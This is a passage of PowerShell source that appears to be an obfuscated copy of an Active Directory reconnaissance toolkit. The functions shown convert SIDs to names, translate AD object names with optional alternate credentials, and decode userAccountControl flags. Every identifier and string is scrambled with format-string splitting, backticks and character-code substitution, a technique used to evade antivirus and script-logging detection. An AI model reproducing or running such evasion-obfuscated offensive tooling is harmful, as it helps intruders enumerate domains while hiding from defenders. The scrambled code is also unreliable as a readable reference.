}


function CoNVER`Tfr`OM-`S`Id {


    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(mANdAtoRy = ${tR`UE}, ValUefrOmPiPeLINE = ${T`RUe}, valuEFrompipElINEByPrOpERTYname = ${tR`UE})]
        [Alias('SID')]
        [ValidatePattern({"{1}{0}"-f'*','^S-1-.'})]
        [String[]]
        ${o`BJ`e`CtsID},

        [ValidateNotNullOrEmpty()]
        [String]
        ${doMA`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'DomainCo','nt','roller'})]
        [String]
        ${SeR`VER},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`E`deNtiAL} =   $21gV7e::"emP`Ty"
    )

    BEGIN {
        ${a`d`NAmEArGum`entS} = @{}
        if (${ps`BOundp`ARaM`et`E`RS}[("{0}{1}" -f'D','omain')]) { ${A`dnAM`EAr`GUmEnTs}[("{0}{1}" -f'Domai','n')] = ${D`OM`AiN} }
        if (${p`sBou`NDPaRAmEt`E`Rs}[("{1}{0}"-f'er','Serv')]) { ${ADn`AMea`Rg`UmeNts}[("{2}{1}{0}"-f'er','erv','S')] = ${SERV`eR} }
        if (${PS`BouN`DPAraMeTe`Rs}[("{2}{0}{3}{1}"-f'den','ial','Cre','t')]) { ${a`DNamEa`Rg`UmeNts}[("{1}{0}{2}"-f'denti','Cre','al')] = ${CRE`dEn`TiAL} }
    }

    PROCESS {
        ForEach (${taRGe`TS`Id} in ${OBJ`eCT`sID}) {
            ${T`ArgE`TS`id} = ${tArg`et`SID}.("{1}{0}" -f 'rim','t').Invoke('*')
            try {
                
                Switch (${TAR`gEt`SId}) {
                    ("{0}{1}" -f'S-','1-0')         { ("{0}{3}{2}{1}"-f 'Nul','ority','uth','l A') }
                    ("{1}{0}{2}"-f '-1-0-','S','0')       { ("{1}{0}"-f'body','No') }
                    ("{0}{1}"-f'S-1','-1')         { ("{2}{1}{3}{0}" -f 'ority','d ','Worl','Auth') }
                    ("{0}{2}{1}"-f 'S','1-1-0','-')       { ("{1}{2}{0}"-f'ryone','E','ve') }
                    ("{0}{1}" -f 'S-1','-2')         { ("{2}{3}{1}{0}"-f'thority','l Au','L','oca') }
                    ("{2}{1}{0}" -f'2-0','-','S-1')       { ("{1}{0}"-f 'ocal','L') }
                    ("{0}{1}{2}" -f'S-1-2','-','1')       { ("{1}{3}{2}{0}"-f'n ','C','o','onsole Log') }
                    ("{0}{1}" -f'S','-1-3')         { ("{4}{5}{0}{1}{3}{2}"-f' ','Aut','rity','ho','Crea','tor') }
                    ("{0}{2}{1}" -f 'S','-0','-1-3')       { ("{2}{1}{0}" -f'wner','or O','Creat') }
                    ("{1}{0}" -f'1-3-1','S-')       { ("{2}{0}{3}{1}"-f 'rea','p','C','tor Grou') }
                    ("{1}{0}{2}" -f'-1-3','S','-2')       { ("{0}{2}{5}{3}{4}{1}"-f 'Creator Ow','r','n',' Serv','e','er') }
                    ("{1}{2}{0}" -f '3-3','S-','1-')       { ("{4}{3}{1}{0}{2}" -f 'oup Serve','r','r','or G','Creat') }
                    ("{1}{0}{2}"-f '-3','S-1','-4')       { ("{2}{3}{1}{0}" -f 'ights','r R','O','wne') }
                    ("{1}{0}"-f'1-4','S-')         { ("{4}{0}{3}{1}{2}{5}{6}" -f'-u','e',' ','niqu','Non','Authori','ty') }
                    ("{1}{0}" -f '-5','S-1')         { ("{0}{2}{1}" -f 'NT ','ority','Auth') }
                    ("{0}{1}{2}"-f 'S','-1-5','-1')       { ("{2}{1}{0}"-f'p','ialu','D') }
                    ("{2}{0}{1}"-f'1-5','-2','S-')       { ("{1}{2}{0}"-f 'work','N','et') }
                    ("{0}{1}"-f'S-','1-5-3')       { ("{0}{1}" -f'B','atch') }
                    ("{0}{1}" -f'S-','1-5-4')       { ("{2}{1}{0}{3}" -f 'i','t','Interac','ve') }
                    ("{0}{1}{2}"-f'S','-1-','5-6')       { ("{1}{0}" -f'e','Servic') }
                    ("{1}{0}{2}"-f '5','S-1-','-7')       { ("{0}{2}{1}"-f 'Anonym','s','ou') }
                    ("{0}{1}{2}" -f 'S-','1-','5-8')       { ("{1}{0}"-f'oxy','Pr') }
                    ("{0}{1}"-f 'S-1-','5-9')       { ("{4}{6}{3}{5}{0}{8}{1}{7}{2}" -f' Con','roll','rs','ise ','Ent','Domain','erpr','e','t') }
                    ("{1}{0}" -f'0','S-1-5-1')      { ("{2}{1}{0}{3}"-f'el','al S','Princip','f') }
                    ("{1}{2}{0}" -f'11','S-1-','5-')      { ("{6}{3}{4}{1}{0}{2}{5}" -f' Use','cated','r','uthen','ti','s','A') }
                    ("{0}{1}"-f'S-','1-5-12')      { ("{3}{2}{1}{0}"-f 'Code','ted ','estric','R') }
                    ("{2}{1}{0}"-f'13','5-','S-1-')      { ("{5}{4}{6}{1}{2}{0}{3}"-f 'U','r','ver ','sers','mi','Ter','nal Se') }
                    ("{2}{1}{0}" -f '-14','-5','S-1')      { ("{6}{1}{2}{0}{5}{3}{4}" -f 'activ','e',' Inter','go','n','e Lo','Remot') }
                    ("{1}{2}{0}"-f'5','S-1','-5-1')      { ("{2}{3}{1}{0}" -f'n ','nizatio','T','his Orga') }
                    ("{1}{0}" -f'-5-17','S-1')      { ("{0}{3}{2}{1}"-f 'This O',' ','zation','rgani') }
                    ("{0}{1}"-f 'S','-1-5-18')      { ("{0}{1}{3}{2}"-f'Local S','y','m','ste') }
                    ("{1}{0}{2}" -f '-1-','S','5-19')      { ("{2}{1}{3}{0}"-f'ty','utho','NT A','ri') }
                    ("{1}{2}{0}" -f '0','S-','1-5-2')      { ("{2}{1}{0}{3}" -f'i',' Author','NT','ty') }
                    ("{2}{0}{1}" -f'80','-0','S-1-5-')    { ("{3}{2}{1}{0}"-f'ces ','ervi',' S','All') }
                    ("{2}{0}{1}{3}"-f '2-5','4','S-1-5-3','4')  { ((("{3}{4}{0}{1}{2}" -f 'L','TINx4P','Administrators','BU','I'))."r`epLa`Ce"(([Char]120+[Char]52+[Char]80),'\')) }
                    ("{0}{2}{1}"-f 'S-1','545','-5-32-')  { ((("{1}{0}{3}{4}{2}{5}" -f'ILT','BU','Z','I','N','fvUsers')) -rEPLaCe([chAr]90+[chAr]102+[chAr]118),[chAr]92) }
                    ("{1}{2}{0}"-f'46','S-1-5-32','-5')  { ((("{0}{1}{3}{2}{4}" -f'BU','ILTINijm','s','Gue','ts'))-rEplace([ChAR]105+[ChAR]106+[ChAR]109),[ChAR]92) }
                    ("{1}{2}{0}"-f'547','S-1-5-3','2-')  { ((("{2}{4}{0}{3}{1}"-f'N{0}Po','ers','BUIL','wer Us','TI'))-f[ChAR]92) }
                    ("{3}{2}{1}{0}"-f'8','54','-','S-1-5-32')  { ((("{2}{8}{5}{1}{6}{0}{4}{7}{3}" -f'Op','nt','BUIL','ors','er','ZAccou',' ','at','TINVq'))  -RePlaCe'VqZ',[CHAR]92) }
                    ("{1}{0}{2}"-f'32-54','S-1-5-','9')  { ((("{1}{3}{2}{5}{4}{0}{6}"-f 'r','B','LT','UI','er Operato','IN{0}Serv','s'))-f  [cHAr]92) }
                    ("{1}{2}{0}"-f'-550','S','-1-5-32')  { ((("{0}{4}{5}{3}{1}{2}" -f'B','nt ','Operators','TPri','UILTIN2','0')) -cREPlaCe ([char]50+[char]48+[char]84),[char]92) }
                    ("{1}{2}{0}"-f '-551','S','-1-5-32')  { ((("{5}{4}{1}{6}{3}{0}{2}" -f'ato','N','rs','up Oper','UILTI','B','{0}Back')) -f [Char]92) }
                    ("{2}{0}{3}{1}" -f'1-','-32-552','S-','5')  { ((("{5}{3}{1}{2}{0}{4}" -f 'ator','{0','}Replic','N','s','BUILTI'))-F[chAr]92) }
                    ("{2}{1}{0}{3}" -f'2-55','1-5-3','S-','4')  { ((("{3}{8}{1}{0}{9}{10}{7}{5}{11}{2}{6}{4}" -f '-W','IN{0}Pre','tibl','BU','cess','0 Comp','e Ac','s 200','ILT','ind','ow','a'))  -F [CHAr]92) }
                    ("{3}{0}{2}{1}"-f'-5','-555','-32','S-1')  { ((("{0}{3}{1}{2}" -f'BUI','te Desktop U','sers','LTIN3QrRemo'))."re`pl`AcE"('3Qr',[sTRINg][char]92)) }
                    ("{1}{0}{3}{2}"-f '1-5-','S-','556','32-')  { ((("{2}{1}{0}{3}{7}{5}{8}{4}{6}" -f't','0}Ne','BUILTIN{','wor','tor','figuration Ope','s','k Con','ra')) -f[ChAR]92) }
                    ("{1}{0}{2}"-f'-5-32','S-1','-557')  { ((("{1}{7}{0}{9}{6}{3}{4}{5}{8}{2}" -f 'in','BUILTINulJInc','ders','es','t ','Tru','r','om','st Buil','g Fo'))-cREPlAce 'ulJ',[char]92) }
                    ("{1}{3}{0}{2}"-f'5-3','S','2-558','-1-')  { ((("{0}{6}{7}{4}{3}{5}{2}{1}"-f 'BU','itor Users','Mon','rm','Perfo','ance ','ILTINN','yC')).("{0}{1}" -f 'rEplAC','e').Invoke('NyC','\')) }
                    ("{1}{3}{2}{0}"-f'9','S-','-5-32-55','1')  { ((("{3}{5}{6}{2}{4}{1}{0}{7}" -f'g Use','Lo','rforman','BU','ce ','ILTINfH','UPe','rs'))."REpL`ACe"(([cHAr]102+[cHAr]72+[cHAr]85),'\')) }
                    ("{3}{0}{2}{1}"-f '-1-5','60','-32-5','S')  { ((("{3}{0}{6}{1}{4}{2}{5}" -f'ILTINnOhWindow','Autho','ion Ac','BU','rizat','cess Group','s '))-Replace  'nOh',[ChaR]92) }
                    ("{0}{2}{1}" -f'S-1-5-','2-561','3')  { ((("{1}{4}{8}{7}{5}{6}{2}{3}{9}{0}" -f's','BUIL','ice','nse Serve','TIN{0','n','al Server L','rmi','}Te','r'))-f[ChAr]92) }
                    ("{0}{1}{2}"-f 'S-1-','5-32-','562')  { ((("{3}{1}{2}{0}{4}{5}" -f'Dist','ILTIN{','0}','BU','ri','buted COM Users')) -f[char]92) }
                    ("{1}{0}{2}"-f '1-5-32-56','S-','9')  { ((("{8}{7}{1}{5}{3}{0}{6}{9}{4}{2}" -f't','IL','s','DAFCryp','or','TIN','ographic O','U','B','perat'))."r`EPL`ACe"(([chaR]68+[chaR]65+[chaR]70),'\')) }
                    ("{2}{1}{0}"-f '3','-1-5-32-57','S')  { ((("{6}{5}{2}{0}{1}{3}{4}" -f'Q7YEvent',' Log','LTIN',' ','Readers','I','BU'))-repLAcE 'Q7Y',[cHAr]92) }
                    ("{0}{1}{3}{2}"-f'S-1-5-','32','74','-5')  { ((("{5}{4}{8}{2}{7}{1}{9}{0}{3}{6}"-f 'COM Ac','ertificate Servi','Wi','ce','UI','B','ss','C','LTINB','ce D'))."rE`pLA`cE"(([chAr]66+[chAr]87+[chAr]105),'\')) }
                    ("{0}{1}{2}" -f'S-','1-5-32','-575')  { ((("{3}{2}{6}{7}{0}{5}{4}{1}" -f 'R','rvers','IN','BUILT','ess Se','emote Acc','fEtRD','S '))  -REplAce  ([cHAR]102+[cHAR]69+[cHAR]116),[cHAR]92) }
                    ("{1}{0}{2}"-f'1-5-32','S-','-576')  { ((("{4}{2}{5}{1}{3}{0}{6}" -f'rv','nt','RDS',' Se','BUILTINJM4',' Endpoi','ers'))."rEP`lACe"(([cHaR]74+[cHaR]77+[cHaR]52),[STRing][cHaR]92)) }
                    ("{1}{3}{0}{2}"-f '32-','S','577','-1-5-')  { ((("{6}{8}{0}{4}{3}{1}{5}{2}{7}" -f'INK','anagem','rv','RDS M','dy','ent Se','BUIL','ers','T'))."R`EPLAce"(([CHar]75+[CHar]100+[CHar]121),[STRInG][CHar]92)) }
                    ("{1}{0}{2}"-f '-5','S-1','-32-578')  { ((("{1}{4}{3}{0}{5}{2}"-f 't','BU','ators','dminis','ILTINBLdHyper-V A','r')) -CREpLacE ([CHaR]66+[CHaR]76+[CHaR]100),[CHaR]92) }
                    ("{2}{1}{0}{3}"-f '2-57','1-5-3','S-','9')  { ((("{0}{1}{9}{5}{2}{8}{3}{7}{4}{10}{6}" -f'B','UILTI','ess','l Ass','tance Oper','6OCAcc','rs','is',' Contro','N','ato')) -CrepLACE'6OC',[ChAR]92) }
                    ("{0}{2}{1}"-f 'S','5-32-580','-1-')  { ((("{2}{11}{6}{0}{7}{3}{8}{1}{9}{10}{4}{5}"-f'{0}Acce',' As','B','s ','tor','s','TIN','s','Control','sist','ance Opera','UIL')) -F[cHAR]92) }
                    ("{0}{1}"-f 'D','efault') {
                        &("{1}{2}{0}"-f 'me','Conve','rt-ADNa') -Identity ${taR`G`etsid} @ADNameArguments
                    }
                }
            }
            catch {
                &("{3}{1}{2}{0}"-f 'e','Verb','os','Write-') ('[Co'+'n'+'vertF'+'rom-S'+'ID] '+'E'+'rror'+' '+'converti'+'ng'+' '+'SI'+'D '+"'$TargetSid' "+': '+"$_")
            }
        }
    }
}


function cO`NVerT-`ADn`AME {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{11}{10}{6}{1}{8}{5}{7}{2}{9}{12}{0}{4}{3}" -f'g','S','Ch','tions','Func','sForS','e','tate','houldProces','a','Us','PS','ngin'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(mANDatorY = ${T`Rue}, ValUEfRoMPiPEliNE = ${T`RUE}, VALUefRomPipELiNebYproPertyNamE = ${T`RuE})]
        [Alias({"{0}{1}" -f'Na','me'}, {"{0}{1}{2}"-f 'Objec','tNa','me'})]
        [String[]]
        ${IdEN`T`ITY},

        [String]
        [ValidateSet('DN', {"{2}{1}{0}" -f 'l','nica','Cano'}, 'NT4', {"{1}{0}" -f 'play','Dis'}, {"{3}{0}{2}{1}" -f'om','Simple','ain','D'}, {"{2}{4}{1}{0}{5}{3}"-f 'e','terpris','E','ple','n','Sim'}, {"{1}{0}" -f'ID','GU'}, {"{1}{0}"-f'known','Un'}, 'UPN', {"{1}{2}{3}{0}"-f'Ex','C','anoni','cal'}, 'SPN')]
        ${oUTp`U`T`TYPe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oMAIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{0}{2}{4}" -f 'ontro','Do','l','mainC','ler'})]
        [String]
        ${se`R`VEr},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Re`DeN`TiAl} =  ( itEM ("vArI"+"abl"+"E:21gv7"+"e")  ).vALUE::"emp`TY"
    )

    BEGIN {
        ${nAme`T`yPes} = @{
            'DN'                =   1  
            ("{2}{1}{0}" -f 'al','nic','Cano')         =   2  
            'NT4'               =   3  
            ("{1}{0}{2}" -f'a','Displ','y')           =   4  
            ("{0}{1}{2}" -f 'Domain','Si','mple')      =   5  
            ("{2}{1}{3}{0}" -f 'ple','pri','Enter','seSim')  =   6  
            ("{1}{0}" -f'UID','G')              =   7  
            ("{0}{1}" -f'Un','known')           =   8  
            'UPN'               =   9  
            ("{0}{1}{2}" -f 'Canonical','E','x')       =   10 
            'SPN'               =   11 
            'SID'               =   12 
        }

        
        function iNv`oKe-`mEtHod([__ComObject] ${oBJ`e`Ct}, [String] ${m`etH`Od}, ${PAra`Me`TeRs}) {
            ${oU`TP`Ut} = ${Nu`Ll}
            ${O`Ut`pUt} = ${ob`JeCT}.("{2}{1}{0}" -f 'ype','T','Get').Invoke().("{1}{0}{2}" -f 'vo','In','keMember').Invoke(${me`THOD}, ("{2}{3}{1}{0}" -f 'ethod','eM','I','nvok'), ${n`ULl}, ${O`BJ`eCT}, ${pa`R`AmeTeRs})
            &("{2}{1}{3}{0}"-f'utput','e','Writ','-O') ${oUtp`Ut}
        }

        function g`ET-`prOP`eRTy([__ComObject] ${O`BjecT}, [String] ${P`ROp`erty}) {
            ${O`Bj`eCt}.("{1}{0}" -f'tType','Ge').Invoke().("{1}{2}{0}{3}" -f'keMembe','Inv','o','r').Invoke(${PR`O`peRTY}, ("{2}{0}{1}" -f 'ropert','y','GetP'), ${n`Ull}, ${ob`ject}, ${n`Ull})
        }

        function Set-Pr`opeR`TY([__ComObject] ${ob`JEcT}, [String] ${P`R`opERTY}, ${Par`A`METERS}) {
            [Void] ${ob`jeCt}.("{0}{2}{1}" -f 'Get','pe','Ty').Invoke().("{1}{0}{2}" -f'okeMembe','Inv','r').Invoke(${pRoP`E`RTy}, ("{3}{1}{0}{2}" -f'o','etPr','perty','S'), ${N`ULl}, ${O`B`JecT}, ${Pa`RaMe`T`ErS})
        }

        
        if (${p`sbOunD`p`ARaM`eTerS}[("{1}{0}{2}" -f 'v','Ser','er')]) {
            ${A`DSINI`TTY`pE} = 2
            ${iN`It`NamE} = ${S`ErVer}
        }
        elseif (${psb`OUNDPARA`m`ETers}[("{1}{0}"-f'omain','D')]) {
            ${AdS`i`Ni`TTYPE} = 1
            ${inI`Tn`A`me} = ${d`O`mAin}
        }
        elseif (${PSBOUnDPA`Ra`m`eTe`RS}[("{2}{0}{1}" -f 'e','ntial','Cred')]) {
            ${c`ReD} = ${c`ReDE`NTI`AL}.("{4}{1}{5}{3}{2}{6}{0}"-f'ential','t','r','o','GetNe','w','kCred').Invoke()
            ${aDSi`N`it`TypE} = 1
            ${In`I`TnA`mE} = ${Cr`Ed}."DoMA`iN"
        }
        else {
            
            ${A`dSINi`TT`YPe} = 3
            ${InITN`Ame} = ${nU`Ll}
        }
    }

    PROCESS {
        ForEach (${tA`RGeTIDE`NtiTY} in ${i`De`NtITy}) {
            if (-not ${p`s`BOUnDparAMeTE`Rs}[("{0}{1}{3}{2}" -f'Outp','u','pe','tTy')]) {
                if (${T`Ar`ge`T`IDeNtITY} -match ((("{1}{6}{4}{3}{2}{5}{0}" -f '+','^[A','[','z]+{0}{0}','Za-','A-Za-z ]','-')) -f [cHar]92)) {
                    ${A`d`soUTPuT`TYPe} = ${nAme`T`yp`Es}[("{1}{2}{3}{0}" -f 'le','Dom','ainSim','p')]
                }
                else {
                    ${AD`SOu`TpUTTY`pE} = ${NA`m`EtyPES}['NT4']
                }
            }
            else {
                ${aD`S`ouT`PUtTy`pE} = ${N`A`m`EtYPes}[${Ou`TpUTt`y`Pe}]
            }

            ${tr`ANsLa`TE} = &("{2}{1}{0}{3}" -f'bje','O','New-','ct') -ComObject ("{1}{2}{0}"-f 'e','NameTra','nslat')

            if (${P`SbounDpAr`AM`etE`RS}[("{1}{2}{3}{0}"-f'ntial','C','r','ede')]) {
                try {
                    ${C`REd} = ${cRE`D`eNt`IaL}.("{4}{0}{2}{1}{3}"-f'twork','r','C','edential','GetNe').Invoke()

                    &("{3}{2}{0}{1}" -f 'e-Me','thod','vok','In') ${T`R`ANSla`TE} ("{0}{1}" -f'I','nitEx') (
                        ${aD`SiNI`Tt`YPe},
                        ${IN`iTna`ME},
                        ${cr`ed}."uSE`RNA`mE",
                        ${c`REd}."d`OMA`In",
                        ${cr`ed}."pas`s`word"
                    )
                }
                catch {
                    &("{0}{3}{1}{4}{2}"-f'Write','Ver','e','-','bos') ('[Convert-ADNa'+'me'+']'+' '+'Er'+'ror '+'i'+'niti'+'alizing'+' '+'tran'+'slation'+' '+'f'+'or '+"'$Identity' "+'us'+'ing '+'al'+'te'+'rnate'+' '+'cre'+'dentia'+'ls '+': '+"$_")
                }
            }
            else {
                try {
                    ${Nu`lL} = &("{2}{0}{1}"-f 'e-Meth','od','Invok') ${T`RanSLA`Te} ("{1}{0}" -f't','Ini') (
                        ${A`DS`i`NItTYPE},
                        ${i`N`ItNaMe}
                    )
                }
                catch {
                    &("{0}{2}{1}"-f'Wr','se','ite-Verbo') ('[C'+'o'+'nver'+'t-ADNa'+'me] '+'E'+'rror'+' '+'i'+'nit'+'ial'+'izing '+'transl'+'atio'+'n '+'fo'+'r '+"'$Identity' "+': '+"$_")
                }
            }

            
            &("{1}{2}{0}" -f'y','Set-Proper','t') ${tr`A`NSLaTe} ("{0}{1}{2}"-f 'C','haseReferr','al') (0x60)

            try {
                
                ${nu`ll} = &("{1}{0}{2}"-f 'oke-Meth','Inv','od') ${T`R`ANSLAtE} 'Set' (8, ${ta`RgEt`I`deNt`Ity})
                &("{3}{1}{2}{0}"-f 'ethod','oke','-M','Inv') ${t`RAn`s`LaTe} 'Get' (${ADSOutpu`Tt`Y`Pe})
            }
            catch [System.Management.Automation.MethodInvocationException] {
                &("{2}{0}{1}" -f'e-','Verbose','Writ') "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message) "
            }
        }
    }
}


function CO`NV`E`R`TfROM-`Uacv`AlUe {


    [OutputType({"{11}{10}{7}{5}{3}{1}{0}{8}{12}{6}{2}{9}{4}"-f'a','i','Ordered','c','nary','ns.Spe','d.','io','l','Dictio','em.Collect','Syst','ize'})]
    [CmdletBinding()]
    Param(
        [Parameter(ManDaToRY = ${t`RuE}, VaLuEFROMpIPELine = ${tR`Ue}, ValUEFROMpIPElIneBYPRopErTYnAMe = ${tR`Ue})]
        [Alias('UAC', {"{0}{3}{1}{4}{2}" -f 'us','raccountcontr','l','e','o'})]
        [Int]
        ${vA`luE},

        [Switch]
        ${s`h`owall}
    )

    BEGIN {
        
        ${U`Acva`LUeS} = &("{0}{2}{1}" -f'New','t','-Objec') ("{3}{7}{6}{0}{4}{5}{1}{2}"-f 's','redDi','ctionary','System.Col','.Specialized','.Orde','n','lectio')
        ${u`ACV`AlUES}.("{0}{1}" -f 'A','dd').Invoke(("{1}{0}" -f 'IPT','SCR'), 1)
        ${uAC`V`AL`UeS}.("{0}{1}" -f'Ad','d').Invoke(("{3}{1}{0}{4}{2}"-f 'OUN','C','ISABLE','AC','TD'), 2)
        ${uAC`Va`lU`Es}.("{0}{1}"-f 'A','dd').Invoke(("{1}{2}{0}{3}" -f 'IR_REQUIRE','HO','MED','D'), 8)
        ${u`AC`VAL`UES}.("{1}{0}" -f 'dd','A').Invoke(("{2}{1}{0}"-f'KOUT','OC','L'), 16)
        ${ua`cVa`LUES}.("{0}{1}"-f'A','dd').Invoke(("{0}{2}{3}{1}"-f'PASS','REQD','WD','_NOT'), 32)
        ${UaC`VaLU`Es}.("{1}{0}" -f 'dd','A').Invoke(("{2}{1}{0}{3}"-f'_C','D_CANT','PASSW','HANGE'), 64)
        ${u`AcV`AluEs}.("{0}{1}" -f 'A','dd').Invoke(("{3}{2}{6}{5}{0}{1}{4}{7}" -f 'D_AL','LOW','CR','EN','E','XT_PW','YPTED_TE','D'), 128)
        ${u`A`c`VaLuEs}.("{0}{1}" -f'Ad','d').Invoke(("{0}{2}{1}{3}{4}{5}" -f'TEM','LICA','P_DUP','TE','_ACCOU','NT'), 256)
        ${u`AC`VALUEs}.("{1}{0}"-f 'dd','A').Invoke(("{3}{0}{4}{2}{1}" -f 'MAL_A','T','N','NOR','CCOU'), 512)
        ${uA`cvA`lues}.("{1}{0}" -f'dd','A').Invoke(("{2}{0}{5}{4}{3}{1}"-f'TERDO','COUNT','IN','UST_AC','AIN_TR','M'), 2048)
        ${U`AcVa`LUes}.("{0}{1}" -f'A','dd').Invoke(("{1}{4}{2}{7}{3}{0}{6}{5}" -f 'CC','W','TATION_T','_A','ORKS','T','OUN','RUST'), 4096)
        ${UA`CvAL`UES}.("{1}{0}"-f 'dd','A').Invoke(("{0}{3}{2}{1}"-f 'SE','OUNT','C','RVER_TRUST_AC'), 8192)
        ${UA`CvA`LUEs}.("{0}{1}" -f'Ad','d').Invoke(("{5}{0}{1}{4}{3}{2}"-f'ONT_EX','P','WORD','_PASS','IRE','D'), 65536)
        ${U`Ac`Valu`ES}.("{0}{1}" -f 'A','dd').Invoke(("{4}{3}{2}{1}{0}"-f 'T','N','U','S_LOGON_ACCO','MN'), 131072)
        ${ua`cVa`L`UES}.("{0}{1}" -f 'Ad','d').Invoke(("{1}{2}{0}{3}" -f 'IR','SMA','RTCARD_REQU','ED'), 262144)
        ${uacVA`lU`eS}.("{1}{0}"-f'd','Ad').Invoke(("{2}{3}{0}{1}" -f 'LE','GATION','TRUST','ED_FOR_DE'), 524288)
        ${U`Acv`AlUES}.("{1}{0}" -f'dd','A').Invoke(("{3}{2}{1}{4}{0}" -f 'D','EGA','L','NOT_DE','TE'), 1048576)
        ${uACv`A`lueS}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{2}{3}{1}"-f 'US','Y_ONLY','E_DE','S_KE'), 2097152)
        ${UAC`V`AlUEs}.("{1}{0}" -f'd','Ad').Invoke(("{1}{2}{0}{3}"-f 'REAUT','DONT_REQ_','P','H'), 4194304)
        ${uAcvA`Lu`Es}.("{0}{1}"-f 'A','dd').Invoke(("{2}{3}{0}{1}"-f'D','_EXPIRED','PAS','SWOR'), 8388608)
        ${UAcV`AlU`es}.("{0}{1}"-f'A','dd').Invoke(("{1}{4}{3}{2}{5}{7}{0}{8}{6}" -f 'E','T','D_','TE','RUS','TO_AUTH_FO','ON','R_DEL','GATI'), 16777216)
        ${u`ACV`ALUES}.("{1}{0}" -f'd','Ad').Invoke(("{4}{0}{3}{2}{5}{1}"-f'R','UNT','AC','ETS_','PARTIAL_SEC','CO'), 67108864)
    }

    PROCESS {
        ${Re`su`lTU`AC`ValuES} = &("{1}{0}{2}"-f'-O','New','bject') ("{10}{4}{8}{1}{12}{7}{6}{3}{5}{0}{11}{9}{2}"-f'eredDicti','llections.S','y','ed.','ystem','Ord','z','ali','.Co','nar','S','o','peci')

        if (${sh`oWa`LL}) {
            ForEach (${uA`cvAL`UE} in ${U`AcvAlU`eS}.("{3}{1}{0}{2}{4}"-f'Enu','t','mer','Ge','ator').Invoke()) {
                if ( (${V`A`LuE} -band ${U`Ac`VALuE}."va`lUe") -eq ${Ua`CVa`luE}."vA`luE") {
                    ${Re`SuL`TuAcv`AlUes}.("{1}{0}" -f 'd','Ad').Invoke(${UACvAL`UE}."na`Me", "$($UACValue.Value)+")
                }
                else {
                    ${RE`S`ULt`UACVALU`ES}.("{0}{1}" -f'Ad','d').Invoke(${uACv`A`Lue}."nA`mE", "$($UACValue.Value)")
                }
            }
        }
        else {
            ForEach (${UaC`V`A`lUE} in ${UAc`ValU`Es}.("{4}{1}{3}{0}{2}"-f 'to','m','r','era','GetEnu').Invoke()) {
                if ( (${V`Alue} -band ${uAC`Val`Ue}."VAL`Ue") -eq ${UA`Cva`lUe}."V`AluE") {
                    ${RES`ULT`UAcV`A`lu`Es}.("{0}{1}"-f'A','dd').Invoke(${U`A`cvALuE}."na`mE", "$($UACValue.Value)")
                }
            }
        }
        ${rE`sUlt`U`ACVaL`UeS}
    }
}


function GE`T-PRIn`C`IPA`l`cON`TEXT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{0}{1}" -f 'dPro','cess','PSSho','ul'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(POsITiOn = 0, MaNDaTORY = ${T`RUe})]
        [Alias({"{0}{2}{1}"-f 'Gro','ame','upN'}, {"{2}{1}{3}{0}"-f'tity','up','Gro','Iden'})]
        [String]
        ${idENt`I`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`oM`Ain},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`EDENTiaL} =  $21gv7e::"em`PTy"
    )

    &("{1}{0}" -f'd-Type','Ad') -AssemblyName ("{0}{8}{5}{6}{1}{7}{2}{4}{3}" -f'Syst','u','e','ent','m','m.Dir','ectoryServices.Acco','ntManag','e')

    try {
        if (${PsB`oUnD`pA`RAM`eTErS}[("{1}{0}" -f'omain','D')] -or (${idenT`I`TY} -match ((("{1}{0}{2}" -f 'UP','.+UPD','D.+'))  -ReplacE ([cHAr]85+[cHAr]80+[cHAr]68),[cHAr]92))) {
            if (${iDe`NtI`TY} -match ((("{2}{1}{3}{0}" -f '.+','Iz','.+zU','UI'))."R`E`PlACe"('zUI',[sTRing][ChAr]92))) {
                
                ${CON`VERtE`DI`d`EntI`Ty} = ${i`deN`TITy} | &("{0}{2}{1}{4}{3}" -f 'Con','-ADN','vert','e','am') -OutputType ("{0}{1}{2}" -f 'Can','onica','l')
                if (${conV`ERte`dideNT`ITy}) {
                    ${cOnNEcTta`R`GEt} = ${cONVeR`Te`Di`dEntiTY}.("{0}{2}{1}" -f'S','String','ub').Invoke(0, ${COnVErtE`dI`DENt`Ity}.("{1}{2}{0}" -f'f','In','dexO').Invoke('/'))
                    ${oBjE`cTidE`N`TiTY} = ${I`dENti`TY}.("{0}{1}" -f 'S','plit').Invoke('\')[1]
                    &("{3}{1}{0}{2}" -f'Ve','e-','rbose','Writ') ('[G'+'et-P'+'rincipalContext'+'] '+'Bindi'+'n'+'g '+'to'+' '+'do'+'main'+' '+"'$ConnectTarget'")
                }
            }
            else {
                ${ob`JEcTiDenT`I`Ty} = ${Ide`NT`iTY}
                &("{3}{1}{2}{0}" -f 'e','ite','-Verbos','Wr') ('['+'Get-Pr'+'incip'+'alContext]'+' '+'Bi'+'nd'+'ing '+'to'+' '+'do'+'m'+'ain '+"'$Domain'")
                ${conNE`cTtARG`et} = ${DO`m`AIn}
            }

            if (${pSb`o`Undp`ArAm`etErs}[("{0}{2}{1}" -f'Cr','al','edenti')]) {
                &("{1}{0}{3}{2}{4}" -f 'r','W','e-Verbo','it','se') ("{4}{1}{7}{5}{9}{3}{8}{10}{2}{6}{0}"-f 'als','Pri','nt',' Using','[Get-','Contex','i','ncipal',' alternate c','t]','rede')
